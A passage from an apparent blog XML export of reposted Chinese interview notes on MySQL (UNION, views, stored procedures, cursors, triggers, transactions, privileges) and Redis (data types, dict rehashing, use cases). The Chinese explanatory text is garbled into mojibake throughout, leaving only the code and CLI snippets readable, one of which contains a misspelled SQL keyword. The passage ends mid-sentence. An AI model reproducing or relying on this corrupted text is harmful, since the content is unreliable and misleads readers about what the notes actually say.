Orders.cust_id; customers è¡¨ï¼š cust_id cust_name 1 a 2 b 3 c orders è¡¨ï¼š order_id cust_id 1 1 2 1 3 3 4 3 ç»“æœï¼š cust_id cust_name order_id 1 a 1 1 a 2 3 c 3 3 c 4 2 b Null åå…­ã€ç»„åˆæŸ¥è¯¢ä½¿ç”¨ UNION æ¥ç»„åˆä¸¤ä¸ªæŸ¥è¯¢ï¼Œå¦‚æœç¬¬ä¸€ä¸ªæŸ¥è¯¢è¿”å› M è¡Œï¼Œç¬¬äºŒä¸ªæŸ¥è¯¢è¿”å› N è¡Œï¼Œé‚£ä¹ˆç»„åˆæŸ¥è¯¢çš„ç»“æœä¸€èˆ¬ä¸º M+N è¡Œã€‚ æ¯ä¸ªæŸ¥è¯¢å¿…é¡»åŒ…å«ç›¸åŒçš„åˆ—ã€è¡¨è¾¾å¼å’Œèšé›†å‡½æ•°ã€‚ é»˜è®¤ä¼šå»é™¤ç›¸åŒè¡Œï¼Œå¦‚æœéœ€è¦ä¿ç•™ç›¸åŒè¡Œï¼Œä½¿ç”¨ UNION ALLã€‚ åªèƒ½åŒ…å«ä¸€ä¸ª ORDER BY å­å¥ï¼Œå¹¶ä¸”å¿…é¡»ä½äºè¯­å¥çš„æœ€åã€‚ 1234567SELECT colFROM mytableWHERE col = 1UNIONSELECT colFROM mytableWHERE col =2; åä¸ƒã€è§†å›¾è§†å›¾æ˜¯è™šæ‹Ÿçš„è¡¨ï¼Œæœ¬èº«ä¸åŒ…å«æ•°æ®ï¼Œä¹Ÿå°±ä¸èƒ½å¯¹å…¶è¿›è¡Œç´¢å¼•æ“ä½œã€‚ å¯¹è§†å›¾çš„æ“ä½œå’Œå¯¹æ™®é€šè¡¨çš„æ“ä½œä¸€æ ·ã€‚ è§†å›¾å…·æœ‰å¦‚ä¸‹å¥½å¤„ï¼š ç®€åŒ–å¤æ‚çš„ SQL æ“ä½œï¼Œæ¯”å¦‚å¤æ‚çš„è¿æ¥ï¼› åªä½¿ç”¨å®é™…è¡¨çš„ä¸€éƒ¨åˆ†æ•°æ®ï¼› é€šè¿‡åªç»™ç”¨æˆ·è®¿é—®è§†å›¾çš„æƒé™ï¼Œä¿è¯æ•°æ®çš„å®‰å…¨æ€§ï¼› æ›´æ”¹æ•°æ®æ ¼å¼å’Œè¡¨ç¤ºã€‚ 1234CREATE VIEW myview ASSELECT Concat(col1, col2) AS concat_col, col3*col4 AS compute_colFROM mytableWHERE col5 = val; åå…«ã€å­˜å‚¨è¿‡ç¨‹å­˜å‚¨è¿‡ç¨‹å¯ä»¥çœ‹æˆæ˜¯å¯¹ä¸€ç³»åˆ— SQL æ“ä½œçš„æ‰¹å¤„ç†ï¼› ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹çš„å¥½å¤„ï¼š ä»£ç å°è£…ï¼Œä¿è¯äº†ä¸€å®šçš„å®‰å…¨æ€§ï¼› ä»£ç å¤ç”¨ï¼› ç”±äºæ˜¯é¢„å…ˆç¼–è¯‘ï¼Œå› æ­¤å…·æœ‰å¾ˆé«˜çš„æ€§èƒ½ã€‚ å‘½ä»¤è¡Œä¸­åˆ›å»ºå­˜å‚¨è¿‡ç¨‹éœ€è¦è‡ªå®šä¹‰åˆ†éš”ç¬¦ï¼Œå› ä¸ºå‘½ä»¤è¡Œæ˜¯ä»¥ ; ä¸ºç»“æŸç¬¦ï¼Œè€Œå­˜å‚¨è¿‡ç¨‹ä¸­ä¹ŸåŒ…å«äº†åˆ†å·ï¼Œå› æ­¤ä¼šé”™è¯¯æŠŠè¿™éƒ¨åˆ†åˆ†å·å½“æˆæ˜¯ç»“æŸç¬¦ï¼Œé€ æˆè¯­æ³•é”™è¯¯ã€‚ åŒ…å« inã€out å’Œ inout ä¸‰ç§å‚æ•°ã€‚ ç»™å˜é‡èµ‹å€¼éƒ½éœ€è¦ç”¨ select into è¯­å¥ã€‚ æ¯æ¬¡åªèƒ½ç»™ä¸€ä¸ªå˜é‡èµ‹å€¼ï¼Œä¸æ”¯æŒé›†åˆçš„æ“ä½œã€‚ 123456789101112delimiter //create procedure myprocedure( out ret int ) begin declare y int; select sum(col1) from mytable into y; select y*y into ret; end //delimiter ; 12call myprocedure(@ret);select @ret; åä¹ã€æ¸¸æ ‡åœ¨å­˜å‚¨è¿‡ç¨‹ä¸­ä½¿ç”¨æ¸¸æ ‡å¯ä»¥å¯¹ä¸€ä¸ªç»“æœé›†è¿›è¡Œç§»åŠ¨éå†ã€‚ æ¸¸æ ‡ä¸»è¦ç”¨äºäº¤äº’å¼åº”ç”¨ï¼Œå…¶ä¸­ç”¨æˆ·éœ€è¦å¯¹æ•°æ®é›†ä¸­çš„ä»»æ„è¡Œè¿›è¡Œæµè§ˆå’Œä¿®æ”¹ã€‚ ä½¿ç”¨æ¸¸æ ‡çš„å››ä¸ªæ­¥éª¤ï¼š å£°æ˜æ¸¸æ ‡ï¼Œè¿™ä¸ªè¿‡ç¨‹æ²¡æœ‰å®é™…æ£€ç´¢å‡ºæ•°æ®ï¼› æ‰“å¼€æ¸¸æ ‡ï¼› å–å‡ºæ•°æ®ï¼› å…³é—­æ¸¸æ ‡ï¼› 1234567891011121314151617181920delimiter //create procedure myprocedure(out ret int) begin declare done boolean default 0; declare mycursor cursor for select col1 from mytable; # å®šä¹‰äº†ä¸€ä¸ª continue handlerï¼Œå½“ sqlstate '02000' è¿™ä¸ªæ¡ä»¶å‡ºç°æ—¶ï¼Œä¼šæ‰§è¡Œ set done = 1 declare continue handler for sqlstate '02000' set done = 1; open mycursor; repeat fetch mycursor into ret; select ret; until done end repeat; close mycursor; end // delimiter ; äºŒåã€è§¦å‘å™¨è§¦å‘å™¨ä¼šåœ¨æŸä¸ªè¡¨æ‰§è¡Œä»¥ä¸‹è¯­å¥æ—¶è€Œè‡ªåŠ¨æ‰§è¡Œï¼šDELETEã€INSERTã€UPDATEã€‚ è§¦å‘å™¨å¿…é¡»æŒ‡å®šåœ¨è¯­å¥æ‰§è¡Œä¹‹å‰è¿˜æ˜¯ä¹‹åè‡ªåŠ¨æ‰§è¡Œï¼Œä¹‹å‰æ‰§è¡Œä½¿ç”¨ BEFORE å…³é”®å­—ï¼Œä¹‹åæ‰§è¡Œä½¿ç”¨ AFTER å…³é”®å­—ã€‚BEFORE ç”¨äºæ•°æ®éªŒè¯å’Œå‡€åŒ–ï¼ŒAFTER ç”¨äºå®¡è®¡è·Ÿè¸ªï¼Œå°†ä¿®æ”¹è®°å½•åˆ°å¦å¤–ä¸€å¼ è¡¨ä¸­ã€‚ INSERT è§¦å‘å™¨åŒ…å«ä¸€ä¸ªåä¸º NEW çš„è™šæ‹Ÿè¡¨ã€‚ 1234CREATE TRIGGER mytrigger AFTER INSERT ON mytableFOR EACH ROW SELECT NEW.col into @result;SELECT @result; -- è·å–ç»“æœ DELETE è§¦å‘å™¨åŒ…å«ä¸€ä¸ªåä¸º OLD çš„è™šæ‹Ÿè¡¨ï¼Œå¹¶ä¸”æ˜¯åªè¯»çš„ã€‚ UPDATE è§¦å‘å™¨åŒ…å«ä¸€ä¸ªåä¸º NEW å’Œä¸€ä¸ªåä¸º OLD çš„è™šæ‹Ÿè¡¨ï¼Œå…¶ä¸­ NEW æ˜¯å¯ä»¥è¢«ä¿®æ”¹åœ°ï¼Œè€Œ OLD æ˜¯åªè¯»çš„ã€‚ MySQL ä¸å…è®¸åœ¨è§¦å‘å™¨ä¸­ä½¿ç”¨ CALL è¯­å¥ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½è°ƒç”¨å­˜å‚¨è¿‡ç¨‹ã€‚ äºŒåä¸€ã€äº‹åŠ¡å¤„ç†åŸºæœ¬æœ¯è¯­ï¼š äº‹åŠ¡ï¼ˆtransactionï¼‰æŒ‡ä¸€ç»„ SQL è¯­å¥ï¼› å›é€€ï¼ˆrollbackï¼‰æŒ‡æ’¤é”€æŒ‡å®š SQL è¯­å¥çš„è¿‡ç¨‹ï¼› æäº¤ï¼ˆcommitï¼‰æŒ‡å°†æœªå­˜å‚¨çš„ SQL è¯­å¥ç»“æœå†™å…¥æ•°æ®åº“è¡¨ï¼› ä¿ç•™ç‚¹ï¼ˆsavepointï¼‰æŒ‡äº‹åŠ¡å¤„ç†ä¸­è®¾ç½®çš„ä¸´æ—¶å ä½ç¬¦ï¼ˆplaceholderï¼‰ï¼Œä½ å¯ä»¥å¯¹å®ƒå‘å¸ƒå›é€€ï¼ˆä¸å›é€€æ•´ä¸ªäº‹åŠ¡å¤„ç†ä¸åŒï¼‰ã€‚ ä¸èƒ½å›é€€ SELECT è¯­å¥ï¼Œå›é€€ SELECT è¯­å¥ä¹Ÿæ²¡æ„ä¹‰ï¼›ä¹Ÿä¸èƒ½å›é€€ CREATE å’Œ DROP è¯­å¥ã€‚ MySQL çš„äº‹åŠ¡æäº¤é»˜è®¤æ˜¯éšå¼æäº¤ï¼Œæ¯æ‰§è¡Œä¸€æ¡è¯­å¥å°±æŠŠè¿™æ¡è¯­å¥å½“æˆä¸€ä¸ªäº‹åŠ¡ç„¶åè¿›è¡Œæäº¤ã€‚å½“å‡ºç° START TRANSACTION è¯­å¥æ—¶ï¼Œä¼šå…³é—­éšå¼æäº¤ï¼›å½“ COMMIT æˆ– ROLLBACK è¯­å¥æ‰§è¡Œåï¼Œäº‹åŠ¡ä¼šè‡ªåŠ¨å…³é—­ï¼Œé‡æ–°æ¢å¤éšå¼æäº¤ã€‚ é€šè¿‡è®¾ç½® autocommit ä¸º 0 å¯ä»¥å–æ¶ˆè‡ªåŠ¨æäº¤ï¼›autocommit æ ‡è®°æ˜¯é’ˆå¯¹æ¯ä¸ªè¿æ¥è€Œä¸æ˜¯é’ˆå¯¹æœåŠ¡å™¨çš„ã€‚ å¦‚æœæ²¡æœ‰è®¾ç½®ä¿ç•™ç‚¹ï¼ŒROLLBACK ä¼šå›é€€åˆ° START TRANSACTION è¯­å¥å¤„ï¼›å¦‚æœè®¾ç½®äº†ä¿ç•™ç‚¹ï¼Œå¹¶ä¸”åœ¨ ROLLBACK ä¸­æŒ‡å®šè¯¥ä¿ç•™ç‚¹ï¼Œåˆ™ä¼šå›é€€åˆ°è¯¥ä¿ç•™ç‚¹ã€‚ 1234567START TRANSACTION// ...SAVEPOINT delete1// ...ROLLBACK TO delete1// ...COMMIT äºŒåäºŒã€å­—ç¬¦é›†åŸºæœ¬æœ¯è¯­ï¼š å­—ç¬¦é›†ä¸ºå­—æ¯å’Œç¬¦å·çš„é›†åˆï¼› ç¼–ç ä¸ºæŸä¸ªå­—ç¬¦é›†æˆå‘˜çš„å†…éƒ¨è¡¨ç¤ºï¼› æ ¡å¯¹å­—ç¬¦æŒ‡å®šå¦‚ä½•æ¯”è¾ƒï¼Œä¸»è¦ç”¨äºæ’åºå’Œåˆ†ç»„ã€‚ é™¤äº†ç»™è¡¨æŒ‡å®šå­—ç¬¦é›†å’Œæ ¡å¯¹å¤–ï¼Œä¹Ÿå¯ä»¥ç»™åˆ—æŒ‡å®šï¼š 123CREATE TABLE mytable(col VARCHAR(10) CHARACTER SET latin COLLATE latin1_general_ci )DEFAULT CHARACTER SET hebrew COLLATE hebrew_general_ci; å¯ä»¥åœ¨æ’åºã€åˆ†ç»„æ—¶æŒ‡å®šæ ¡å¯¹ï¼š 123SELECT *FROM mytableORDER BY col COLLATE latin1_general_ci; äºŒåä¸‰ã€æƒé™ç®¡ç†MySQL çš„è´¦æˆ·ä¿¡æ¯ä¿å­˜åœ¨ mysql è¿™ä¸ªæ•°æ®åº“ä¸­ã€‚ 12USE mysql;SELECT user FROM user; åˆ›å»ºè´¦æˆ· 1CREATE USER myuser IDENTIFIED BY 'mypassword'; æ–°åˆ›å»ºçš„è´¦æˆ·æ²¡æœ‰ä»»ä½•æƒé™ã€‚ ä¿®æ”¹è´¦æˆ·å 1RENAME myuser TO newuser; åˆ é™¤è´¦æˆ· 1DROP USER myuser; æŸ¥çœ‹æƒé™ 1SHOW GRANTS FOR myuser; æˆäºˆæƒé™ 1GRANT SELECT, INSERT ON mydatabase.* TO myuser; è´¦æˆ·ç”¨ username@host çš„å½¢å¼å®šä¹‰ï¼Œusername@% ä½¿ç”¨çš„æ˜¯é»˜è®¤ä¸»æœºåã€‚ åˆ é™¤æƒé™ 1REVOKE SELECT, INSERT ON mydatabase.* FROM myuser; GRANT å’Œ REVOKE å¯åœ¨å‡ ä¸ªå±‚æ¬¡ä¸Šæ§åˆ¶è®¿é—®æƒé™ï¼š æ•´ä¸ªæœåŠ¡å™¨ï¼Œä½¿ç”¨ GRANT ALL å’Œ REVOKE ALLï¼› æ•´ä¸ªæ•°æ®åº“ï¼Œä½¿ç”¨ ON database.*ï¼› ç‰¹å®šçš„è¡¨ï¼Œä½¿ç”¨ ON database.tableï¼› ç‰¹å®šçš„åˆ—ï¼› ç‰¹å®šçš„å­˜å‚¨è¿‡ç¨‹ã€‚ æ›´æ”¹å¯†ç  å¿…é¡»ä½¿ç”¨ Password() å‡½æ•° 1SET PASSWROD FOR myuser = Password('new_password'); å‚è€ƒèµ„æ–™ BenForta. SQL å¿…çŸ¥å¿…ä¼š [M]. äººæ°‘é‚®ç”µå‡ºç‰ˆç¤¾, 2013.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FRedis%2F</url>
    <content type="text"><![CDATA[ä¸€ã€æ¦‚è¿° äºŒã€æ•°æ®ç±»å‹ STRING LIST SET HASH ZSET ä¸‰ã€æ•°æ®ç»“æ„ å­—å…¸ è·³è·ƒè¡¨ å››ã€ä½¿ç”¨åœºæ™¯ è®¡æ•°å™¨ ç¼“å­˜ æŸ¥æ‰¾è¡¨ æ¶ˆæ¯é˜Ÿåˆ— ä¼šè¯ç¼“å­˜ åˆ†å¸ƒå¼é”å®ç° å…¶å®ƒ äº”ã€Redis ä¸ Memcached æ•°æ®ç±»å‹ æ•°æ®æŒä¹…åŒ– åˆ†å¸ƒå¼ å†…å­˜ç®¡ç†æœºåˆ¶ å…­ã€é”®çš„è¿‡æœŸæ—¶é—´ ä¸ƒã€æ•°æ®æ·˜æ±°ç­–ç•¥ å…«ã€æŒä¹…åŒ– å¿«ç…§æŒä¹…åŒ– AOF æŒä¹…åŒ– ä¹ã€å‘å¸ƒä¸è®¢é˜… åã€äº‹åŠ¡ åä¸€ã€äº‹ä»¶ æ–‡ä»¶äº‹ä»¶ æ—¶é—´äº‹ä»¶ äº‹ä»¶çš„è°ƒåº¦ä¸æ‰§è¡Œ åäºŒã€å¤åˆ¶ è¿æ¥è¿‡ç¨‹ ä¸»ä»é“¾ åä¸‰ã€Sentinel åå››ã€åˆ†ç‰‡ åäº”ã€ä¸€ä¸ªç®€å•çš„è®ºå›ç³»ç»Ÿåˆ†æ æ–‡ç« ä¿¡æ¯ ç‚¹èµåŠŸèƒ½ å¯¹æ–‡ç« è¿›è¡Œæ’åº å‚è€ƒèµ„æ–™ ä¸€ã€æ¦‚è¿°Redis æ˜¯é€Ÿåº¦éå¸¸å¿«çš„éå…³ç³»å‹ï¼ˆNoSQLï¼‰å†…å­˜é”®å€¼æ•°æ®åº“ï¼Œå¯ä»¥å­˜å‚¨é”®å’Œäº”ç§ä¸åŒç±»å‹çš„å€¼ä¹‹é—´çš„æ˜ å°„ã€‚ é”®çš„ç±»å‹åªèƒ½ä¸ºå­—ç¬¦ä¸²ï¼Œå€¼æ”¯æŒçš„äº”ç§ç±»å‹æ•°æ®ç±»å‹ä¸ºï¼šå­—ç¬¦ä¸²ã€åˆ—è¡¨ã€é›†åˆã€æœ‰åºé›†åˆã€æ•£åˆ—è¡¨ã€‚ Redis æ”¯æŒå¾ˆå¤šç‰¹æ€§ï¼Œä¾‹å¦‚å°†å†…å­˜ä¸­çš„æ•°æ®æŒä¹…åŒ–åˆ°ç¡¬ç›˜ä¸­ï¼Œä½¿ç”¨å¤åˆ¶æ¥æ‰©å±•è¯»æ€§èƒ½ï¼Œä½¿ç”¨åˆ†ç‰‡æ¥æ‰©å±•å†™æ€§èƒ½ã€‚ äºŒã€æ•°æ®ç±»å‹ æ•°æ®ç±»å‹ å¯ä»¥å­˜å‚¨çš„å€¼ æ“ä½œ STRING å­—ç¬¦ä¸²ã€æ•´æ•°æˆ–è€…æµ®ç‚¹æ•° å¯¹æ•´ä¸ªå­—ç¬¦ä¸²æˆ–è€…å­—ç¬¦ä¸²çš„å…¶ä¸­ä¸€éƒ¨åˆ†æ‰§è¡Œæ“ä½œ å¯¹æ•´æ•°å’Œæµ®ç‚¹æ•°æ‰§è¡Œè‡ªå¢æˆ–è€…è‡ªå‡æ“ä½œ LIST åˆ—è¡¨ ä»ä¸¤ç«¯å‹å…¥æˆ–è€…å¼¹å‡ºå…ƒç´  è¯»å–å•ä¸ªæˆ–è€…å¤šä¸ªå…ƒç´  è¿›è¡Œä¿®å‰ªï¼Œåªä¿ç•™ä¸€ä¸ªèŒƒå›´å†…çš„å…ƒç´  SET æ— åºé›†åˆ æ·»åŠ ã€è·å–ã€ç§»é™¤å•ä¸ªå…ƒç´  æ£€æŸ¥ä¸€ä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨äºé›†åˆä¸­ è®¡ç®—äº¤é›†ã€å¹¶é›†ã€å·®é›† ä»é›†åˆé‡Œé¢éšæœºè·å–å…ƒç´  HASH åŒ…å«é”®å€¼å¯¹çš„æ— åºæ•£åˆ—è¡¨ æ·»åŠ ã€è·å–ã€ç§»é™¤å•ä¸ªé”®å€¼å¯¹ è·å–æ‰€æœ‰é”®å€¼å¯¹ æ£€æŸ¥æŸä¸ªé”®æ˜¯å¦å­˜åœ¨ ZSET æœ‰åºé›†åˆ æ·»åŠ ã€è·å–ã€åˆ é™¤å…ƒç´  æ ¹æ®åˆ†å€¼èŒƒå›´æˆ–è€…æˆå‘˜æ¥è·å–å…ƒç´  è®¡ç®—ä¸€ä¸ªé”®çš„æ’å What Redis data structures look like STRING 12345678&gt; set hello worldOK&gt; get hello"world"&gt; del hello(integer) 1&gt; get hello(nil) LIST 123456789101112131415161718192021&gt; rpush list-key item(integer) 1&gt; rpush list-key item2(integer) 2&gt; rpush list-key item(integer) 3&gt; lrange list-key 0 -11) "item"2) "item2"3) "item"&gt; lindex list-key 1"item2"&gt; lpop list-key"item"&gt; lrange list-key 0 -11) "item2"2) "item" SET 123456789101112131415161718192021222324252627&gt; sadd set-key item(integer) 1&gt; sadd set-key item2(integer) 1&gt; sadd set-key item3(integer) 1&gt; sadd set-key item(integer) 0&gt; smembers set-key1) "item"2) "item2"3) "item3"&gt; sismember set-key item4(integer) 0&gt; sismember set-key item(integer) 1&gt; srem set-key item2(integer) 1&gt; srem set-key item2(integer) 0&gt; smembers set-key1) "item"2) "item3" HASH 123456789101112131415161718192021222324&gt; hset hash-key sub-key1 value1(integer) 1&gt; hset hash-key sub-key2 value2(integer) 1&gt; hset hash-key sub-key1 value1(integer) 0&gt; hgetall hash-key1) "sub-key1"2) "value1"3) "sub-key2"4) "value2"&gt; hdel hash-key sub-key2(integer) 1&gt; hdel hash-key sub-key2(integer) 0&gt; hget hash-key sub-key1"value1"&gt; hgetall hash-key1) "sub-key1"2) "value1" ZSET 12345678910111213141516171819202122232425&gt; zadd zset-key 728 member1(integer) 1&gt; zadd zset-key 982 member0(integer) 1&gt; zadd zset-key 982 member0(integer) 0&gt; zrange zset-key 0 -1 withscores1) "member1"2) "728"3) "member0"4) "982"&gt; zrangebyscore zset-key 0 800 withscores1) "member1"2) "728"&gt; zrem zset-key member1(integer) 1&gt; zrem zset-key member1(integer) 0&gt; zrange zset-key 0 -1 withscores1) "member0"2) "982" ä¸‰ã€æ•°æ®ç»“æ„å­—å…¸ä»¥ä¸‹æ˜¯ Redis å­—å…¸çš„ä¸»è¦æ•°æ®ç»“æ„ï¼Œä»ä¸Šå¾€ä¸‹åˆ†æï¼Œä¸€ä¸ª dict æœ‰ä¸¤ä¸ª dicthtï¼Œä¸€ä¸ª dictht æœ‰ä¸€ä¸ª dictEntry æ•°ç»„ï¼Œæ¯ä¸ª dictEntry æœ‰ next æŒ‡é’ˆå› æ­¤æ˜¯ä¸€ä¸ªé“¾è¡¨ç»“æ„ã€‚ä»ä¸Šé¢çš„åˆ†æå¯ä»¥çœ‹å‡º Redis çš„å­—å…¸æ˜¯ä¸€ä¸ªåŸºäºæ‹‰é“¾æ³•è§£å†³å†²çªçš„å“ˆå¸Œè¡¨ç»“æ„ã€‚ 1234567typedef struct dict &#123; dictType *type; void *privdata; dictht ht[2]; long rehashidx; /* rehashing not in progress if rehashidx == -1 */ unsigned long iterators; /* number of iterators currently running */&#125; dict; 12345678/* This is our hash table structure. Every dictionary has two of this as we * implement incremental rehashing, for the old to the new table. */typedef struct dictht &#123; dictEntry **table; unsigned long size; unsigned long sizemask; unsigned long used;&#125; dictht; 12345678910typedef struct dictEntry &#123; void *key; union &#123; void *val; uint64_t u64; int64_t s64; double d; &#125; v; struct dictEntry *next;&#125; dictEntry; å“ˆå¸Œè¡¨éœ€è¦å…·å¤‡æ‰©å®¹èƒ½åŠ›ï¼Œåœ¨æ‰©å®¹æ—¶å°±éœ€è¦å¯¹æ¯ä¸ªé”®å€¼å¯¹è¿›è¡Œ rehashã€‚dict æœ‰ä¸¤ä¸ª dicthtï¼Œåœ¨ rehash çš„æ—¶å€™ä¼šå°†ä¸€ä¸ª dictht ä¸Šçš„é”®å€¼å¯¹é‡æ–°æ’å…¥å¦ä¸€ä¸ª dictht ä¸Šé¢ï¼Œå®Œæˆä¹‹åé‡Šæ”¾ç©ºé—´å¹¶äº¤æ¢ä¸¤ä¸ª dictht çš„è§’è‰²ã€‚ rehash æ“ä½œä¸æ˜¯ä¸€æ¬¡æ€§å®Œæˆï¼Œè€Œæ˜¯é‡‡ç”¨æ¸è¿›æ–¹å¼ï¼Œè¿™æ˜¯ä¸ºäº†é¿å…ä¸€æ¬¡æ€§æ‰§è¡Œè¿‡å¤šçš„ rehash æ“ä½œç»™æœåŠ¡å™¨å¸¦æ¥è¿‡å¤§çš„è´Ÿæ‹…ã€‚ æ¸è¿›å¼ rehash é€šè¿‡è®°å½• dict çš„ rehashidx å®Œæˆï¼Œå®ƒä» 0 å¼€å§‹ç„¶åæ¯æ‰§è¡Œä¸€æ¬¡ rehash éƒ½ä¼šé€’å¢ã€‚ä¾‹å¦‚åœ¨ä¸€æ¬¡ rehash ä¸­ï¼Œè¦æŠŠ dict[0] rehash åˆ° dict[1]ï¼Œè¿™ä¸€æ¬¡ä¼šæŠŠ dict[0] ä¸Š table[rehashidx] çš„é”®å€¼å¯¹ rehash åˆ° dict[1] ä¸Šï¼Œdict[0] çš„ table[rehashidx] æŒ‡å‘ nullï¼Œå¹¶ä»¤ rehashidx++ã€‚ åœ¨ rehash æœŸé—´ï¼Œæ¯æ¬¡å¯¹å­—å…¸æ‰§è¡Œæ·»åŠ ã€åˆ é™¤ã€æŸ¥æ‰¾æˆ–è€…æ›´æ–°æ“ä½œæ—¶ï¼Œéƒ½ä¼šæ‰§è¡Œä¸€æ¬¡æ¸è¿›å¼ rehashã€‚ é‡‡ç”¨æ¸è¿›å¼ rehash ä¼šå¯¼è‡´å­—å…¸ä¸­çš„æ•°æ®åˆ†æ•£åœ¨ä¸¤ä¸ª dictht ä¸Šï¼Œå› æ­¤å¯¹å­—å…¸çš„æ“ä½œä¹Ÿéœ€è¦åˆ°å¯¹åº”çš„ dictht å»æ‰§è¡Œã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/* Performs N steps of incremental rehashing. Returns 1 if there are still * keys to move from the old to the new hash table, otherwise 0 is returned. * * Note that a rehashing step consists in moving a bucket (that may have more * than one key as we use chaining) from the old to the new hash table, however * since part of the hash table may be composed of empty spaces, it is not * guaranteed that this function will rehash even a single bucket, since it * will visit at max N*10 empty buckets in total, otherwise the amount of * work it does would be unbound and the function may block for a long time. */int dictRehash(dict *d, int n) &#123; int empty_visits = n * 10; /* Max number of empty buckets to visit. */ if (!dictIsRehashing(d)) return 0; while (n-- &amp;&amp; d-&gt;ht[0].used != 0) &#123; dictEntry *de, *nextde; /* Note that rehashidx can't overflow as we are sure there are more * elements because ht[0].used != 0 */ assert(d-&gt;ht[0].size &gt; (unsigned long) d-&gt;rehashidx); while (d-&gt;ht[0].table[d-&gt;rehashidx] == NULL) &#123; d-&gt;rehashidx++; if (--empty_visits == 0) return 1; &#125; de = d-&gt;ht[0].table[d-&gt;rehashidx]; /* Move all the keys in this bucket from the old to the new hash HT */ while (de) &#123; uint64_t h; nextde = de-&gt;next; /* Get the index in the new hash table */ h = dictHashKey(d, de-&gt;key) &amp; d-&gt;ht[1].sizemask; de-&gt;next = d-&gt;ht[1].table[h]; d-&gt;ht[1].table[h] = de; d-&gt;ht[0].used--; d-&gt;ht[1].used++; de = nextde; &#125; d-&gt;ht[0].table[d-&gt;rehashidx] = NULL; d-&gt;rehashidx++; &#125; /* Check if we already rehashed the whole table... */ if (d-&gt;ht[0].used == 0) &#123; zfree(d-&gt;ht[0].table); d-&gt;ht[0] = d-&gt;ht[1]; _dictReset(&amp;d-&gt;ht[1]); d-&gt;rehashidx = -1; return 0; &#125; /* More to rehash... */ return 1;&#125; è·³è·ƒè¡¨æ˜¯æœ‰åºé›†åˆçš„åº•å±‚å®ç°ä¹‹ä¸€ã€‚ è·³è·ƒè¡¨æ˜¯åŸºäºå¤šæŒ‡é’ˆæœ‰åºé“¾è¡¨å®ç°çš„ï¼Œå¯ä»¥çœ‹æˆå¤šä¸ªæœ‰åºé“¾è¡¨ã€‚ åœ¨æŸ¥æ‰¾æ—¶ï¼Œä»ä¸Šå±‚æŒ‡é’ˆå¼€å§‹æŸ¥æ‰¾ï¼Œæ‰¾åˆ°å¯¹åº”çš„åŒºé—´ä¹‹åå†åˆ°ä¸‹ä¸€å±‚å»æŸ¥æ‰¾ã€‚ä¾‹å¦‚ä¸‹å›¾æ¼”ç¤ºäº†æŸ¥æ‰¾ 22 çš„è¿‡ç¨‹ã€‚ ä¸çº¢é»‘æ ‘ç­‰å¹³è¡¡æ ‘ç›¸æ¯”ï¼Œè·³è·ƒè¡¨å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š æ’å…¥é€Ÿåº¦éå¸¸å¿«é€Ÿï¼Œå› ä¸ºä¸éœ€è¦å¹³è¡¡æ ‘çš„æ—‹è½¬æ“ä½œï¼› æ›´å®¹æ˜“å®ç°ï¼› æ”¯æŒæ— é”æ“ä½œã€‚ å››ã€ä½¿ç”¨åœºæ™¯è®¡æ•°å™¨å¯ä»¥å¯¹ String è¿›è¡Œè‡ªå¢è‡ªå‡è¿ç®—ï¼Œä»è€Œå®ç°è®¡æ•°å™¨åŠŸèƒ½ã€‚ ä¾‹å¦‚å¯¹äºç½‘ç«™è®¿é—®é‡ï¼Œå¦‚æœä½¿ç”¨ MySQL æ•°æ®åº“è¿›è¡Œå­˜å‚¨ï¼Œé‚£ä¹ˆæ¯è®¿é—®ä¸€æ¬¡ç½‘ç«™å°±è¦å¯¹ç£ç›˜è¿›è¡Œè¯»å†™æ“ä½œã€‚è€Œå¯¹ Redis è¿™ç§å†…å­˜å‹æ•°æ®åº“çš„è¯»å†™æ€§èƒ½éå¸¸é«˜ï¼Œå¾ˆé€‚åˆå­˜å‚¨è¿™ç§é¢‘ç¹è¯»å†™çš„è®¡æ•°é‡ã€‚ ç¼“å­˜å°†çƒ­ç‚¹æ•°æ®æ”¾åˆ°å†…å­˜ä¸­ï¼Œè®¾ç½®å†…å­˜çš„æœ€å¤§ä½¿ç”¨é‡ä»¥åŠæ·˜æ±°ç­–ç•¥æ¥ä¿è¯ç¼“å­˜çš„å‘½ä¸­ç‡ã€‚ æŸ¥æ‰¾è¡¨ä¾‹å¦‚ DNS è®°å½•å°±å¾ˆé€‚åˆä½¿ç”¨ Redis è¿›è¡Œå­˜å‚¨ã€‚ æŸ¥æ‰¾è¡¨å’Œç¼“å­˜ç±»ä¼¼ï¼Œä¹Ÿæ˜¯åˆ©ç”¨äº† Redis å¿«é€Ÿçš„æŸ¥æ‰¾ç‰¹æ€§ã€‚ä½†æ˜¯æŸ¥æ‰¾è¡¨çš„å†…å®¹ä¸èƒ½å¤±æ•ˆï¼Œè€Œç¼“å­˜çš„å†…å®¹å¯ä»¥å¤±æ•ˆã€‚ æ¶ˆæ¯é˜Ÿåˆ—List æ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå¯ä»¥é€šè¿‡ lpop å’Œ lpush å†™å…¥å’Œè¯»å–æ¶ˆæ¯ã€‚ ä¸è¿‡æœ€å¥½ä½¿ç”¨ Kafkaã€RabbitMQ ç­‰æ¶ˆæ¯ä¸­é—´ä»¶ã€‚ ä¼šè¯ç¼“å­˜åœ¨åˆ†å¸ƒå¼åœºæ™¯ä¸‹å…·æœ‰å¤šä¸ªåº”ç”¨æœåŠ¡å™¨ï¼Œå¯ä»¥ä½¿ç”¨ Redis æ¥ç»Ÿä¸€å­˜å‚¨è¿™äº›åº”ç”¨æœåŠ¡å™¨çš„ä¼šè¯ä¿¡æ¯ï¼Œä½¿å¾—æŸä¸ªåº”ç”¨æœåŠ¡å™¨å®•æœºæ—¶ä¸ä¼šä¸¢å¤±ä¼šè¯ä¿¡æ¯ï¼Œä»è€Œä¿è¯é«˜å¯ç”¨ã€‚ åˆ†å¸ƒå¼é”å®ç°åœ¨åˆ†å¸ƒå¼åœºæ™¯ä¸‹ï¼Œæ— 